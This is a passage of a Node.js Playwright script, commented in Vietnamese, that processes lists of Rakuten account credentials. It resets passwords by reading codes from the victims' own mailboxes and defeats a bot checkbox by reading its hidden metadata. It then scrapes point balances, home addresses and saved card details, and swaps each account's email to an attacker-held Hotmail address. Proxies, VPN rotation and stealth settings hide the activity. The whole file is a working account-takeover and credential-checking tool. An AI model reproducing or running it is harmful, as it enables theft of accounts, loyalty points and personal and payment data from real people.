        lastError.includes("ECONNREFUSED") ||
        lastError.includes("ETIMEDOUT");

      if (isAuthError || isConfigError) {
        fs.appendFileSync(
          path.resolve(__dirname, "email_error.txt"),
          `${email}|${password}|CRITICAL_ERROR_EMAIL: ${lastError}|${new Date().toLocaleString()}\n`,
          "utf8",
        );
        throw new Error(
          `Email Error (${isAuthError ? "AUTH" : "IMAP"}): ${lastError}`,
        );
      }
    }
    await sleep(5000);
  }
  fs.appendFileSync(
    path.resolve(__dirname, "email_error.txt"),
    `${email}|${password}|ERROR_EMAIL: ${lastError}|${new Date().toLocaleString()}\n`,
    "utf8",
  );
  return null;
}

async function safeClick(locator) {
  try {
    await locator.scrollIntoViewIfNeeded();
    await locator.click({ timeout: 10000 });
  } catch (err) {
    try {
      await locator.evaluate((el) => el.click());
    } catch (fallbackErr) {
      warning(
        `Cả hai phương pháp click đều thất bại: ${String(err)}, ${String(fallbackErr)}`,
      );
      throw fallbackErr;
    }
  }
}

async function changePasswordFlow(page, email, password, newPassword, tag) {
  try {
    console.log(`${tag} → Bắt đầu đổi password...`);

    await page.goto(
      "https://login.account.rakuten.com/sso/authorize?client_id=rakuten_ichiba_top_web&service_id=s245&response_type=code&scope=openid&redirect_uri=https%3A%2F%2Fwww.rakuten.co.jp%2F#/sign_in/forgot_password/email",
      {
        waitUntil: "domcontentloaded",
      },
    );

    await sleep(2000);

    const forgotLink = page
      .getByText("Forgot your password?", { exact: false })
      .first();
    await safeClick(forgotLink);
    await sleep(2000);

    const emailInput = page.locator("#email");
    await emailInput.fill(email);
    await sleep(2000);

    const checkboxInfo = await page.evaluate(async () => {
      const challenger = document.querySelector("r10-challenger");
      if (!challenger || !challenger.challengerMain) return null;
      const challenge = challenger.challengerMain.cores.values().next()
        ?.value?.challenge;
      if (!challenge) return null;
      const metadata = JSON.parse(challenge.mdata);
      let realId = null;
      for (const [id, info] of Object.entries(metadata)) {
        if (info.input === "checkbox" && info.render === 0) {
          realId = id;
          break;
        }
      }
      const el = Array.from(challenge.inputFieldsDiv.childNodes).find(
        (item) => item.id === realId,
      );
      if (!el) return null;
      const rect = el.getBoundingClientRect();
      return {
        x: rect.left,
        y: rect.top,
        width: rect.width,
        height: rect.height,
      };
    });

    if (checkboxInfo && checkboxInfo.width > 0) {
      await page.mouse.move(
        checkboxInfo.x + checkboxInfo.width / 2,
        checkboxInfo.y + checkboxInfo.height / 2,
        { steps: 15 },
      );
      await page.mouse.down();
      await sleep(100);
      await page.mouse.up();
      await sleep(5000);
    }

    const sendEmailButton = page
      .getByText("Send email", { exact: false })
      .first();
    await sendEmailButton.click();
    await sleep(5000);

    const enterCode = page.getByRole("button", {
      name: "Enter the email verification code",
    });
    await enterCode.waitFor({ timeout: 10000 });
    await enterCode.click();
    await sleep(3000);

    const code = await readCodeFromEmail(email, password, "password_reset");
    if (!code)
      return {
        ok: false,
        message: "Không đọc được code từ email.",
      };
    await page.locator('input[aria-label="Verification code"]').fill(code);
    await sleep(2000);
    await page.locator('input[aria-label="New password"]').fill(newPassword);
    await sleep(1000);
    await page
      .locator('input[aria-label="Re-enter password"]')
      .fill(newPassword);
    await sleep(1000);

    await page.getByRole("button", { name: "Create a new password" }).click();
    await sleep(20000);

    try {
      const successMsg = await page
        .getByText("Password successfully reset", { exact: false })
        .isVisible();
      if (successMsg) {
        console.log(`${tag} → ✅ Đổi password thành công (message)`);
        return { ok: true };
      }
      if (currentUrl.includes("https://www.rakuten.co.jp/?code=")) {
        console.log(`${tag} → ✅ Đổi password thành công`);
        return { ok: true };
      }
      // check still login page
    } catch (e) {
      const currentUrl = page.url();
      if (currentUrl.includes("https://www.rakuten.co.jp/?code=")) {
        console.log(`${tag} → ✅ Đổi password thành công`);
        return { ok: true };
      }
    }
    return { ok: false, message: "Không xác định được kết quả đổi pass" };
  } catch (err) {
    return { ok: false, message: err.message };
  }
}

// Hotmail class for managing Microsoft Graph API
class Hotmail {
  constructor(mail, password, refreshToken, clientId) {
    this.mail = mail;
    this.password = password;
    this.clientId = clientId;
    this.refreshToken = refreshToken;
    this.accessToken = null;
  }

  async getAccessToken() {
    const tokenUrl =
      "https://login.microsoftonline.com/common/oauth2/v2.0/token";
    const params = new URLSearchParams({
      client_id: this.clientId,
      grant_type: "refresh_token",
      refresh_token: this.refreshToken,
      scope: "https://graph.microsoft.com/.default offline_access",
    });

    try {
      const response = await httpsRequest(tokenUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "Content-Length": params.toString().length,
        },
        body: params.toString(),
      });

      this.accessToken = response.access_token;
      return this.accessToken;
    } catch (e) {
      throw new Error(`Failed to get access token: ${e.message}`);
    }
  }

  async getMessages() {
    if (!this.accessToken) {
      await this.getAccessToken();
    }

    const url =
      "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages";

    try {
      const response = await httpsRequest(url, {
        method: "GET",
        headers: {
          Authorization: `Bearer ${this.accessToken}`,
        },
      });

      const emails = response.value || [];
      const messages = [];

      for (const mail of emails) {
        if (mail.body && mail.body.content) {
          messages.push(mail.body.content);
        }
      }

      return messages;
    } catch (e) {
      throw new Error(`Failed to get messages: ${e.message}`);
    }
  }
}

// Extract OTP from HTML content (similar to extract_otp_from_html in main.py)
function extractOtpFromHtml(htmlContent) {
  if (!htmlContent) return null;

  // Normalize / unescape HTML entities
  const s = htmlContent
    .replace(/&amp;/g, "&")
    .replace(/&lt;/g, "<")
    .replace(/&gt;/g, ">")
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'");

  // Pattern -1: specific phrase for Rakuten
  const matchRakuten = s.match(/verification code is as follows:\s*(\d{6})/i);
  if (matchRakuten) return matchRakuten[1].trim();

  // Pattern 0: Extract OTP from element with class "otp"
  const pattern0 =
    /class\s*=\s*["'](?:[^"']*\s)?otp(?:\s[^"']*)?["'][^>]*>(\d{6})/is;
  let m = s.match(pattern0);
  if (m) return m[1].trim();

  // Pattern 1: your verification code is:
  const pattern1 =
    /your verification code is:<\/span><\/div><\/td><\/tr>.*?<div[^>]*><span>(\d{6})<\/span><\/div>/is;
  m = s.match(pattern1);
  if (m) return m[1].trim();

  // Pattern 2: verification code followed by 6 digits
  const pattern2 = /verification code.*?(\d{6})/is;
  m = s.match(pattern2);
  if (m) return m[1].trim();

  // Pattern 3: Find 6-digit codes but exclude hex color codes
  const pattern3 = /\b(\d{6})\b/g;
  let match;
  while ((match = pattern3.exec(s)) !== null) {
    const startPos = match.index;
    const sixDigitCode = match[1];

    // Check if it's part of a color code
    const prefix = s.substring(Math.max(0, startPos - 1), startPos);
    if (prefix === "#") continue;

    // Check for "color code" text nearby
    const nearbyText = s
      .substring(Math.max(0, startPos - 20), startPos)
      .toLowerCase();
    if (nearbyText.includes("color") && nearbyText.includes("code")) continue;

    return sixDigitCode.trim();
  }

  return null;
}

// Get OTP from hotmail (similar to _get_otp_from_hotmail in main.py)
async function getOtpFromHotmail(hotmailConfig, previousOtp = null, tag = "") {
  try {
    const hotmail = new Hotmail(
      hotmailConfig.email,
      hotmailConfig.password,
      hotmailConfig.refreshToken,
      hotmailConfig.clientId,
    );

    // Get access token first
    await hotmail.getAccessToken();

    // Retry up to 30 times (similar to Python version)
    for (let attempt = 0; attempt < 30; attempt++) {
      try {
        const messages = await hotmail.getMessages();

        for (const msg of messages) {
          const otp = extractOtpFromHtml(msg);
          if (otp && String(otp) !== String(previousOtp)) {
            console.log(`${tag} → ✅ Lấy OTP thành công: ${otp}`);
            return otp;
          }
        }
      } catch (e) {
        // Ignore error and retry
        console.warn(`${tag} → Thử lại ${attempt + 1}/30 lấy OTP...`);
      }

      // Random delay between 5-15 seconds
      const delay = randInt(5000, 15000);
      await sleep(delay);
    }

    return null;
  } catch (e) {
    console.error(`${tag} → ⚠️ Lỗi khi gọi API OTP: ${e.message}`);
    return null;
  }
} // Check skip button (similar to check_skip in main.py)
async function checkSkip(page) {
  try {
    await page.waitForSelector("#seco_473", { timeout: 5000 });
    await page.click("#seco_473");
    await sleep(5000);
  } catch (e) {
    // Skip button not found, continue
  }
}

// Change email function (similar to _change_email in main.py)
async function changeEmail(page, email, password, hotmailString, tag) {
  try {
    // Parse hotmail string: new_email|password|refresh_token|client_id
    const hotmailParts = hotmailString.split("|");
    if (hotmailParts.length < 2) {
      console.error(`${tag} → Định dạng hotmail không hợp lệ`);
      return { success: false, message: "Invalid hotmail format" };
    }

    const [newEmail, newEmailPass, refreshToken, clientId] = hotmailParts;

    // Navigate to account security page
    await page.goto("https://profile.id.rakuten.co.jp/account-security", {
      timeout: 60000,
    });
    await checkSkip(page);
    await sleep(3000);

    // If redirected to login, retry
    if (page.url().includes("login.account.rakuten.com")) {
      await page.goto("https://profile.id.rakuten.co.jp/account-security", {
        timeout: 60000,
      });
      await sleep(3000);
    }

    // Click change email button
    try {
      await page.waitForSelector('[data-qa-id="email-edit-field"]', {
        timeout: 15000,
      });
      await page.click('[data-qa-id="email-edit-field"]');
      await sleep(1500);
    } catch (e) {
      console.error(`${tag} → Không tìm thấy nút chỉnh sửa email`);
      return { success: false, message: "Email edit button not found" };
    }

    // click text Send verification code
    try {
      await page
        .getByRole("button", { name: "Send verification code" })
        .click();
      console.log(`${tag} → Đã nhấn Send verification code, chờ 2s...`);
      await sleep(2000);

      const code = await readCodeFromEmail(email, password, "otp");
      if (!code) {
        console.error(`${tag} → Timeout đợi mã OTP`);
        return { success: false, message: "Timeout reading OTP code" };
      }
      console.log(`${tag} → Lấy OTP thành công: ${code}`);

      await sleep(2000);
      await page.waitForSelector('input[aria-label="Verification code"]', {
        timeout: 15000,
      });
      await page.fill('input[aria-label="Verification code"]', String(code));
      await sleep(1000);

      await page.getByRole("button", { name: "Verify" }).click();
      console.log(`${tag} → Đã nhấn Verify OTP`);
      await sleep(3000);
    } catch (e) {
      console.error(`${tag} → Lỗi xác thực OTP: ${e.message}`);
      return {
        success: false,
        message: `OTP verification error: ${e.message}`,
      };
    }

    // Enter new email
    try {
      await page.waitForSelector('input[name="email"]', { timeout: 15000 });
      await page.fill('input[name="email"]', newEmail);
      await sleep(800);
    } catch (e) {
      console.error(`${tag} → Lỗi khi nhập email mới`);
      return { success: false, message: "Error entering new email" };
    }

    // Click submit button
    try {
      await page.waitForSelector('[data-qa-id="submit-update-email"]', {
        timeout: 10000,
      });
      await page.click('[data-qa-id="submit-update-email"]');
    } catch (e) {
      console.error(`${tag} → Không tìm thấy nút submit`);
      return { success: false, message: "Submit button not found" };
    }

    await sleep(15000);

    // Get OTP from hotmail or IMAP
    let otpCode = null;
    if (refreshToken && clientId) {
      const hotmailConfig = {
        email: newEmail,
        password: newEmailPass,
        refreshToken,
        clientId,
      };
      otpCode = await getOtpFromHotmail(hotmailConfig, null, tag);
    } else if (newEmailPass) {
      otpCode = await readCodeFromEmail(newEmail, newEmailPass, "otp");
      if (!otpCode) {
        console.error(`${tag} → Timeout đợi mã OTP từ email mới`);
        return {
          success: false,
          message: "Timeout reading OTP from new email",
        };
      }
    }

    if (!otpCode) {
      console.error(`${tag} → Không thể lấy OTP từ email`);
      return { success: false, message: "Could not get OTP from email" };
    } // Enter OTP
    try {
      await page.waitForSelector("#VerifyCode", { timeout: 60000 });
      await page.fill("#VerifyCode", String(otpCode));
      await sleep(3000);
      await page.click("#submit");
      console.log(`${tag} → Đã submit OTP để xác thực email`);
      await sleep(10000);
      // "#editEmail > div > p" contains changed email
      const changedEmail = await page.$eval('#editEmail > div > p', el => el.textContent.trim());
      if (changedEmail && changedEmail.includes(newEmail)) {
        console.log(`${tag} → ✅ Đổi email thành công thành: ${newEmail}`);
        return { success: true, message: newEmail };
      } else {
        return { success: false, message: 'Đổi email không thành công' };
      }
    } catch (e) {
      console.error(`${tag} → Lỗi khi nhập/submit OTP`);
      return { success: false, message: "Error entering/submitting OTP" };
    }
  } catch (e) {
    console.error(`${tag} → Lỗi khi đổi email:`, e.message);
    return { success: false, message: "Error changing email" };
  }
}

// Check points similar to _check_points in main.py
async function checkPoints(page, tag) {
  const pointsDetails = [];
  const extraDetails = [];

  try {
    // Navigate to points page
    const pointsUrl =
      "https://point.rakuten.co.jp/?l-id=top_normal_myrakuten_point"; // Retry navigation
    let navSuccess = false;
    for (let attempt = 0; attempt < 2; attempt++) {
      try {
        await page.goto(pointsUrl, {
          waitUntil: "networkidle",
          timeout: 30000,
        });
        navSuccess = true;
        break;
      } catch (e) {
        if (attempt === 1) {
          console.warn(`${tag} → Không thể truy cập trang điểm`);
          return { success: false, summary: "" };
        }
        await sleep(3000);
      }
    }

    if (!navSuccess) return { success: false, summary: "" };

    // 1. Total Points (.point-total dd)
    try {
      await page.waitForSelector(".point-total dd", { timeout: 5000 });
      const el = await page.$(".point-total dd");
      if (el) {
        const text = await el.textContent();
        const cleaned = text.trim().replace(/[^\d]/g, "");
        if (cleaned) {
          const value = parseInt(cleaned, 10);
          pointsDetails.push(`Total Point: ${value.toLocaleString()}`);
        }
      }
    } catch (e) {
      // Not found, skip
    }

    // 2. Operation Points (.point-gadget-display-point .point_num)
    try {
      await page.waitForSelector(".point-gadget-display-point .point_num", {
        timeout: 5000,
      });
      const el = await page.$(".point-gadget-display-point .point_num");
      if (el) {
        const text = await el.textContent();
        const cleaned = text.trim().replace(/[^\d]/g, "");
        if (cleaned) {
          const value = parseInt(cleaned, 10);
          pointsDetails.push(`Operation: ${value.toLocaleString()}`);
        }
      }
    } catch (e) {
      // Not found, skip
    }

    // 3. Add Points (#js-pointBankTotalBalance .point_num)
    try {
      await page.waitForSelector("#js-pointBankTotalBalance .point_num", {
        timeout: 5000,
      });
      const el = await page.$("#js-pointBankTotalBalance .point_num");
      if (el) {
        const text = await el.textContent();
        const cleaned = text.trim().replace(/[^\d]/g, "");
        if (cleaned) {
          const value = parseInt(cleaned, 10);
          pointsDetails.push(`Add: ${value.toLocaleString()}`);
        }
      }
    } catch (e) {
      // Not found, skip
    }

    // 4. Navigate to my.rakuten.co.jp for Cash Points & Rank
    try {
      await page.goto("https://my.rakuten.co.jp/?l-id=pc_footer_account", {
        waitUntil: "networkidle",
        timeout: 30000,
      });
      await sleep(3000);

      // Cash Points
      try {
        const el = await page.$(
          '[data-ratid="available-rcash-area"] span:nth-child(2)',
        );
        if (el) {
          const text = await el.textContent();
          const cleaned = text.trim().replace(/[^\d]/g, "");
          if (cleaned) {
            const value = parseInt(cleaned, 10);
            pointsDetails.push(`Cash: ${value.toLocaleString()}`);
          }
        }
      } catch (e) { }

      // Rank
      try {
        const rankEl = await page.$(".PointGadget_user_rank__CqOqY");
        if (rankEl) {
          let rankText = await rankEl.textContent();
          // rankText = rankText.replace("あなたは", "").replace("です", "").trim();
          extraDetails.push(`Rank(${rankText})`);
        }
      } catch (e) { }
    } catch (e) {
      // Not found, skip
    }

    // 5. Address: https://profile.id.rakuten.co.jp/addresses/jp
    try {
      await page.goto("https://profile.id.rakuten.co.jp/addresses/jp", {
        waitUntil: "networkidle",
        timeout: 30000,
      });
      await sleep(2000);
      const addrEl = await page.$('[data-qa-id="address-summary"]');
      if (addrEl) {
        const text = await addrEl.innerText();
        const cleaned = text
          .split("\n")
          .map((s) => s.trim())
          .filter(Boolean)
          .join(" ");
        extraDetails.push(`Address(${cleaned})`);
      }
    } catch (e) { }

    // 6. List card: https://profile.id.rakuten.co.jp/payments
    try {
      await page.goto("https://profile.id.rakuten.co.jp/payments", {
        waitUntil: "domcontentloaded",
        timeout: 30000,
      });
      await sleep(8000);
      await page.waitForSelector('[data-qa-id^="card-"]', {
        timeout: 15000,
      });

      const cards = await page.locator('[data-qa-id^="card-"]').evaluateAll(
        (els) => {
          return els
            .map((card) => {
              const getText = (selector) => {
                const el = card.querySelector(selector);
                return el?.textContent?.trim() || "";
              };

              const num = getText('[data-qa-id="card-number"]')
                .replace("下4桁", "")
                .trim();

              const name = getText('[data-qa-id="card-holder-name"]');

              const exp = getText('[data-qa-id="card-expiry-date"]');

              if (!num && !name && !exp) return null;

              return {
                number: num,
                name,
                exp,
                raw: `${num} ${name} ${exp}`.replace(/\s+/g, " ").trim(),
              };
            })
            .filter(Boolean);
        },
      );

      if (cards.length > 0) {
        extraDetails.push(`Cards(${cards.map((c) => c.raw).join(", ")})`);
      }
    } catch (e) {
      console.log("Không thể lấy danh sách thẻ", e.message);
    }

    // Combine
    let summary = pointsDetails.join(" | ");
    if (extraDetails.length > 0) {
      if (summary) summary += " | ";
      summary += extraDetails.join("-");
    }

    // Return result
    if (summary) {
      return { success: true, summary };
    } else {
      return { success: false, summary: "" };
    }
  } catch (e) {
    console.warn(`${tag} → Lỗi khi kiểm tra điểm:`, e.message);
    return { success: false, summary: "" };
  }
}


// global processed count for ExpressVPN rotate
let globalProcessed = 0;
let rotating = false;
async function maybeRotateExpressIfNeeded(useExpress) {
  if (!useExpress) return;
  if (globalProcessed > 0 && globalProcessed % EXPRESS_ROTATE_EVERY === 0) {
    if (rotating) return;
    rotating = true;
    try {
      const srv = pickRandom(EXPRESS_JP_SERVERS);
      await connectExpress(srv);
    } catch (e) {
      console.warn("Lỗi khi xoay ExpressVPN:", e.message || e);
    } finally {
      rotating = false;
    }
  }
}

// context options factory
function makeContextOptions(proxyObj) {
  return {
    userAgent: randomUserAgent(),
    viewport: { width: randInt(1200, 1440), height: randInt(760, 900) },
    // locale: 'ja-JP',
    // timezoneId: 'Asia/Tokyo',
    locale: "en-US",
    timezoneId: "America/New_York",
    ...(proxyObj
      ? {
        proxy: {
          server: proxyObj.server,
          username: proxyObj.username,
          password: proxyObj.password,
        },
      }
      : {}),
  };
}

// --- helper: retry a Playwright action when network slow ---
async function retryAction(actionFn, retries = 3, delayMs = 5000) {
  for (let i = 0; i < retries; i++) {
    try {
      return await actionFn();
    } catch (err) {
      const msg = err.message || "";
      if (
        msg.includes("Timeout") ||
        msg.includes("net::ERR") ||
        msg.includes("Navigation failed")
      ) {
        console.warn(`⚠️ Thử lại ${i + 1}/${retries} sau sự cố mạng...`);
        await sleep(delayMs);
        continue;
      } else {
        throw err;
      }
    }
  }
  throw new Error(`All ${retries} retries failed`);
}

// MAIN: per-account browser lifecycle (launch -> create context/page -> operate -> close)
async function processAccountAtSlot(
  slotPos,
  slotSize,
  acc,
  idx,
  useProxy,
  proxies,
  useExpress,
  headlessReq,
  hotmail = null,
) {
  const tag = `#${idx} ${acc.email}`;
  const oldPassword = acc.password;
  const scaledWidth = Math.floor(slotSize.width * 0.35);
  const scaledHeight = Math.floor(slotSize.height * 0.35);

  const args = [
    `--window-size=${scaledWidth},${scaledHeight}`,
    `--window-position=${slotPos.x},${slotPos.y}`,
    "--no-sandbox",
    "--disable-dev-shm-usage",
    "--disable-blink-features=AutomationControlled",
    "--disable-infobars",
  ];

  // nếu chọn headless (ẩn), Playwright sẽ không mở cửa sổ thật
  const launchOptions = {
    headless: headlessReq,
    args,
  };
  // per-account browser launch args (positioned)
  if (LAUNCH_CHROME_PATH) launchOptions.executablePath = LAUNCH_CHROME_PATH;

  // choose per-account launch-proxy only if useProxy and want browser-level proxy
  const launchProxy =
    useProxy && proxies.length > 0 ? proxies[(idx - 1) % proxies.length] : null;
  if (launchProxy) {
    launchOptions.proxy = { server: launchProxy.server };
    if (launchProxy.username)
      launchOptions.proxy.username = launchProxy.username;
    if (launchProxy.password)
      launchOptions.proxy.password = launchProxy.password;
  }

  let browser;
  let context;
  try {
    browser = await chromium.launch(launchOptions);
  } catch (e) {
    console.error(`${tag} → LỖI khi khởi động trình duyệt:`, e.message);
    const errorLine = `${acc.email}|${oldPassword}|${acc.password}|Browser launch failed\n`;
    fs.appendFileSync(
      path.resolve(__dirname, "no_point_account.txt"),
      errorLine,
      "utf8",
    );
    // Remove account from file
    removeAccountFromFile(acc.email);
    return;
  }

  try {
    // create context with possibly different proxy (context-level) if desired; here reuse launchProxy for simplicity
    const contextOptions = makeContextOptions(launchProxy);
    context = await browser.newContext(contextOptions);
    await context.addInitScript(stealthInitScript());
    const page = await context.newPage();
    page.setDefaultTimeout(TIMEOUT_MS);
    page.setDefaultNavigationTimeout(TIMEOUT_MS);

    // small human-like delay
    await sleep(randInt(300, 1200));

    // --- NEW FLOW: changePassword -> checkPoints -> changeEmail ---

    let loginSuccess = false;
    if (acc.changePassword) {
      const cpRes = await changePasswordFlow(
        page,
        acc.email,
        acc.password,
        acc.changePassword,
        tag,
      );
      if (cpRes.ok) {
        loginSuccess = true;
      } else {
        console.log(`❌ ${tag} → Đổi password thất bại`);
        const errorLine = `${acc.email}|${oldPassword}|${acc.password}|Lỗi acc die hoặc locked\n`;
        fs.appendFileSync(
          path.resolve(__dirname, "accdie.txt"),
          errorLine,
          "utf8",
        );
        // Remove account from file
        removeAccountFromFile(acc.email);
        return;
      }
    }

    if (!loginSuccess) {
      // Regular login
      await retryAction(() =>
        page.goto(LOGIN_URL, {
          waitUntil: "domcontentloaded",
          timeout: TIMEOUT_MS,
        }),
      );
      await retryAction(() =>
        page.waitForSelector("#user_id", { timeout: TIMEOUT_MS }),
      );
      await retryAction(() => page.fill("#user_id", acc.email));
      await page.keyboard.press("Enter");
      await retryAction(() =>
        page.waitForSelector("#password_current", { timeout: TIMEOUT_MS }),
      );
      await retryAction(() => page.fill("#password_current", acc.password));
      await page.keyboard.press("Enter");

      const outcome = await waitForLoginResult(page, TIMEOUT_MS);
      if (outcome === "success") {
        loginSuccess = true;
      } else {
        console.log(`❌ ${tag} → Đăng nhập thất bại (${outcome})`);
        const failLine = `${acc.email}|${oldPassword}|${acc.password}|Login failed\n`;
        fs.appendFileSync(
          path.resolve(__dirname, "accdie.txt"),
          failLine,
          "utf8",
        );
        removeAccountFromFile(acc.email);
        return;
      }
    }

    if (loginSuccess) {
      console.log(
        `✅ ${tag} → Đã đăng nhập — đang kiểm tra điểm (Check-point)`,
      );
      const pointsData = await checkPoints(page, tag);
      // console.log("pointsData", pointsData);
      let changedEmailResult = null;
      if (hotmail) {
        console.log(`🔄 ${tag} → Đang thử đổi email...`);
        const changeResult = await changeEmail(
          page,
          acc.email,
          acc.password,
          hotmail,
          tag,
        );
        if (changeResult.success) {
          console.log(
            `✅ ${tag} → Đã đổi email thành: ${changeResult.message}`,
          );
          changedEmailResult = hotmail;
          removeHotmailFromFile(hotmail);
        } else {
          console.log(
            `❌ ${tag} → Đổi email thất bại: ${changeResult.message}`,
          );
        }
      }

      if (pointsData.success) {
        const pointLine = changedEmailResult
          ? `${acc.email}|${oldPassword}|${acc.changePassword}|${pointsData.summary}|${changedEmailResult}\n`
          : `${acc.email}|${oldPassword}|${acc.changePassword}|${pointsData.summary}|Không đổi được email\n`;
        fs.appendFileSync(
          path.resolve(__dirname, "point_account.txt"),
          pointLine,
          "utf8",
        );
      } else {
        const noPointLine = changedEmailResult
          ? `${acc.email}|${oldPassword}|${acc.changePassword}|0|${changedEmailResult}\n`
          : `${acc.email}|${oldPassword}|${acc.changePassword}|0\n`;
        fs.appendFileSync(
          path.resolve(__dirname, "no_point_account.txt"),
          noPointLine,
          "utf8",
        );
      }

      removeAccountFromFile(acc.email);
    }
    return;
  } catch (e) {
    console.error(`${tag} → Lỗi không mong đợi:`, e.message);
  } finally {
    try {
      await context.close();
      if (browser) await browser.close();
    } catch (err) { }
  }
}

// ---------------- ENTRY ----------------
(async () => {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });
  const ask = (q) => new Promise((res) => rl.question(q, res));

  const modeAns = await ask(
    "Chọn chế độ mạng (1 = Proxy, 2 = ExpressVPN) [default 1]: ",
  );
  const showAns = await ask(
    "Hiển thị trình duyệt? (1 = Hiển thị, 2 = Ẩn) [default 1]: ",
  );
  const concAns = await ask(
    `Số worker song song? [default ${DEFAULT_CONCURRENCY}]: `,
  );
  rl.close();

  const useProxy = modeAns.trim() === "" || modeAns.trim() === "1";
  const useExpress = modeAns.trim() === "2";
  const headlessReq = showAns.trim() === "2";
  const concurrency = concAns.trim()
    ? Math.max(1, parseInt(concAns.trim(), 10))
    : DEFAULT_CONCURRENCY;

  if (headlessReq) {
    console.log(
      "LƯU Ý: Bạn đã chọn chế độ ẩn trình duyệt; vị trí xếp ô sẽ bị bỏ qua (mỗi tài khoản sẽ chạy riêng trình duyệt ẩn).",
    );
  }

  console.log("Chế độ:", useProxy ? "Proxy" : "ExpressVPN");
  console.log("Chế độ ẩn:", headlessReq);
  console.log("Số worker song song:", concurrency);

  appendHeaderFiles();

  const accounts = readAccounts();
  if (accounts.length === 0) {
    console.log("Không tìm thấy tài khoản. Thoát chương trình.");
    process.exit(0);
  }
  const proxies = readProxies();
  const hotmails = readHotmails();

  if (hotmails.length > 0) {
    console.log(`Đã tải ${hotmails.length} tài khoản hotmail để đổi email`);
  }

  // initial express connect
  if (useExpress) {
    try {
      await connectExpress(pickRandom(EXPRESS_JP_SERVERS));
    } catch (e) {
      console.warn("Kết nối Express lần đầu thất bại:", e.message || e);
    }
  }

  // detect screen and compute grid positions (for visible mode)
  const dims = await detectScreenSize();
  const grid = computeGridForConcurrency(concurrency, dims.w, dims.h);
  console.log(
    `Màn hình ${dims.w}x${dims.h} → lưới ${grid.cols}x${grid.rows}, mỗi ô ${grid.winW}x${grid.winH}`,
  );

  // prepare slot positions (we will assign workerId -> slot index)
  const slots = [];
  for (let i = 0; i < concurrency; i++) {
    const col = i % grid.cols;
    const row = Math.floor(i / grid.cols);
    const x = col * (grid.winW + grid.spacingW);
    const y = row * (grid.winH + grid.spacingH);
    slots.push({ x, y, width: grid.winW, height: grid.winH });
  }

  // queue
  const queue = accounts.slice();
  let idx = 0;
  const workers = [];
  const actualConcurrency = Math.min(concurrency, queue.length);

  // spawn worker loops
  for (let w = 0; w < actualConcurrency; w++) {
    const workerId = w + 1;
    const slot = slots[w % slots.length];

    // stagger start
    await sleep(200);

    const p = (async () => {
      while (true) {
        const acc = queue.shift();
        if (!acc) break;
        idx++;
        // Get hotmail for this account (rotate through hotmails list)
        const hotmail =
          hotmails.length > 0 ? hotmails[(idx - 1) % hotmails.length] : null;
        // process account at this worker's slot (launch browser per-account)
        await processAccountAtSlot(
          slot,
          { width: slot.width, height: slot.height },
          acc,
          idx,
          useProxy,
          proxies,
          useExpress,
          headlessReq,
          hotmail,
        );

        globalProcessed++;
        if (useExpress) await maybeRotateExpressIfNeeded(useExpress);
        // small random gap before next account
        await sleep(randInt(300, 1200));
      }
      console.log(`Worker ${workerId} đã hoàn thành`);
    })();

    workers.push(p);
  }

  await Promise.all(workers);
  console.log(
    "Hoàn tất. Các file kết quả: point_account.txt, no_point_account.txt, accdie.txt",
  );
  process.exit(0);
})();
